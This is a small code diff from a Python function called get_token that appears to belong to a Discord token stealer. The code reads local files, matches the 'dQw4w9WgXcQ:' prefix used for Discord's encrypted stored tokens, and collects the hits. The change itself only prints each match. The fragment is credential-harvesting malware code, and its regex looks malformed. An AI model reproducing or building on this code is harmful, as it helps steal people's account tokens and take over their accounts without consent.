@@ -72,6 +72,7 @@ def get_token():
                         for x in files.readlines():
                             x.strip()
                             for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
+                                print(values)
                                 tokens.append(values)
                 except PermissionError: continue
         for i in tokens:
